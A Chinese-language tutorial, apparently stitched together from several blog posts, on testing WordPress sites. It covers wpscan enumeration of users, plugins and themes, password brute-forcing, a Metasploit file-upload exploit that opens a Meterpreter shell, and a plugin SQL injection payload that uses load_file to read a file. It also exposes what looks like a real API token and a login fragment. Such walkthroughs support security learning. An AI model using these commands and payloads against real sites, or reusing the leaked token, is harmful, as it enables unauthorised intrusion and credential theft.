很多企业官网使用的WordPress搭建。

^
# **wpscan扫描器**
使用wpscan工具扫描历史漏洞和插件组件漏洞。
如：任意文件读取等。

需要注册token才能查看漏洞信息
<https://blog.csdn.net/weixin_44628122/article/details/107250045>
3312@qq.com+ 123
```
命令时带上token
--api-token mKcu3vyatgfAvUnipF7VMuZEuI2Lr3SGVjAp4ani1aQ
```


kali中可以使用wpscan：
```text
wpscan --url https://www.xxxxx.wiki/
```

> 演示案例：

* 我们扫描192.168.43.104:8000这个站点（此站点存在一个WordPress进程）

![](https://pic3.zhimg.com/v2-b90cd10071461ee62a625f52f4698a20_r.jpg)

![](https://pic4.zhimg.com/v2-f30e534aa4bbe3e6d6580aa7c5b32aff_r.jpg)

## 五、扫描指定用户

* 格式：

```text
wpscan --url https://www.xxxxxxx.wiki/ --enumerate u
```

## 六、**暴力破解得到密码**

* **在暴力破解之前，需要提供一个字典文件**
* 格式：

```text
wpscan --url  https://www.xxxxx.wiki/  -e  u --wordlist 字典文件路径
```

## 七、**扫描插件漏洞**

* 插件可以扩展`WordPress`站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机
* 我们可以使用下列命令扫描`WordPress`站点中安装的插件：

1. wpscan --url [https://www.xxxxx.wiki/](https://link.zhihu.com/?target=https%3A//www.xxxxx.wiki/) --enumerate p
2.
3. //备注：--url与-u参数相同，下面雷同

* 我们可以使用下列命令来扫描目标插件中的安全漏洞：

```text
wpscan --url https://www.xxxxx.wiki/ --enumerate vp
```

## 八、**主题漏洞扫描**

* 使用下列命令对主题进行扫描：

```text
wpscan --url https://www.xxxxx.wiki --enumerate t
```

> 演示案例：

![](https://pic1.zhimg.com/v2-3673956c30b6f8797b6bd8788b7e17ce_r.jpg)

* 看到总共数据库中的402个主题，发现了3个主题，但是发现的主题不一定有这么多，会在下面显示

![](https://picx.zhimg.com/v2-6e69696ff70649a8dd4a643e0653e2df_r.jpg)

* 使用下列命令扫描主题中存在的漏洞：

```text
wpscan --url https://www.xxxxxx.wiki --enumerate vt
```

## 九、**`TimThumbs`文件漏洞扫描**

```text
wpscan -u https://www.xxxxxx.wiki/ -enumerate tt
```

^


## 结合Metasploit利用插件中的漏洞

接下来，我们将用第一个插件中的任意文件上传漏洞来进行漏洞利用演示，该漏洞允许我们上传恶意文件并实现远程代码执行。

打开终端窗口并输入下列命令：

```
useexploit/unix/webapp/wp_reflexgallery_file_upload
msfexploit(wp_reflexgallery_file_upload) > set rhost 192.168.0.101
msfexploit(wp_reflexgallery_file_upload) > set targetURI /wordpress/
msfexploit(wp_reflexgallery_file_upload) > exploit
```

你将看到终端与目标设备建立了Meterpreter会话，你可以输入下列命令查看目标系统信息：

```
Sysinfo
```

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287971789768.png!small)

## 枚举WordPress用户名

我们可以在终端中输入下列命令来枚举WordPress用户名：

```
./wpscan.rb -u http://192.168.0.101/wordpress/ --enumerate u
```

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972068549.png!small)

接下来工具将导出用户名数据表，你可以看到用户名以及对应的ID信息。

当然了，你也可以使用下列命令枚举出所有的内容：

```
./wpscan.rb -u http://192.168.0.101/wordpress/ -e at -e ap -e u
–e at : enumerate all themes of targeted website
–e ap: enumerate all plugins of targeted website
–e u: enumerate all usernames of targeted website
```

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972309586.png!small)

## 使用WPScan进行暴力破解

在进行暴力破解攻击之前，我们需要创建对应的字典文件。输入下列命令：

```
./wpscan.rb –u http://192.168.0.101/wordpress/ --wordlist /root/Desktop/dict.txt --usernameadmin
```

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/1528797258105.png!small)

如果找到了相匹配的用户名与密码，工具将直接以admin:password的形式显示出来：



^
# **wp扩展漏洞**
WordPress Double Opt-In for Download 插件 2.0.9 版本中, public/class-doifd.php 文件中 populate_download_edit_form 函数中 id 参数未经过滤，直接拼接 SQL 语句，导致 SQL 注入漏洞。
```
public function populate_download_edit_form() {

    global $wpdb; // this is how you get access to the database

    if( isset( $_POST[ 'id' ] ) ) {

        $value = $_POST[ 'id' ];

        $download = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}doifd_lab_downloads WHERE doifd_download_id = $value", ARRAY_A );
    }
    echo json_encode( $download );
    die(); // this is required to terminate immediately and return a proper response
}
```
这里的$_POST[ ‘id’ ]没有经过过滤直接带入了sql语句，造成了sql注入。
注册登录，POST发送如下数据包：
```
/wp-admin/admin-ajax.php?action=populate_download_edit_form 


Content-Type: application/x-www-form-urlencoded
data:
id=0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)
```